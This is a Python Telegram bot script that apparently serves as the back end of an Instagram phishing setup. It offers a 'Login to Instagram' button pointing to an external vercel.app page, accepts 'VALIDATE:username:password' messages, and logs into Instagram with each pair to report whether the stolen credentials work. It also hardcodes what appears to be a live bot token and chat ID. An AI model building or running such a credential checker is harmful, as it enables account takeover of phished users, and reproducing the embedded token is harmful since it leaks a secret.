from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters
from instagrapi import Client
import re

# ==============================================
# CONFIGURATION
# ==============================================
BOT_TOKEN = "8951869861:AAE78tVj2UiI7Jdmpk_-Didprk44ur5HFuM"
CHAT_ID = "7374813787"
AUTHORIZED_USERS = [CHAT_ID]
# ==============================================

async def validate_instagram(username, password):
    try:
        cl = Client()
        cl.login(username, password)
        user_id = cl.user_id
        return True, f"✅ VALID CREDENTIALS!\n\nUsername: {username}\nUser ID: {user_id}"
    except Exception as e:
        error_msg = str(e)
        if "wrong password" in error_msg.lower():
            return False, f"❌ WRONG PASSWORD\n\nUsername: {username}"
        elif "user not found" in error_msg.lower():
            return False, f"❌ USER NOT FOUND\n\nUsername: {username}"
        else:
            return False, f"❌ LOGIN FAILED\n\nError: {error_msg[:100]}"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.message.from_user.id)
    if user_id not in AUTHORIZED_USERS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    button = InlineKeyboardButton(
        "🔐 Login to Instagram",
        web_app={"url": "https://signin-cyan.vercel.app"}
    )
    keyboard = [[button]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "👋 Instagram Login Validator\n\n"
        "Click the button below to login.",
        reply_markup=reply_markup
    )

async def handle_validation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle validation requests from HTML"""
    text = update.message.text
    
    if text.startswith('VALIDATE:'):
        parts = text.split(':')
        if len(parts) >= 3:
            username = parts[1]
            password = parts[2]
            
            success, message = await validate_instagram(username, password)
            await update.message.reply_text(message)
        else:
            await update.message.reply_text("❌ Invalid format")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_validation))
    app.run_polling()

if __name__ == "__main__":
    main()
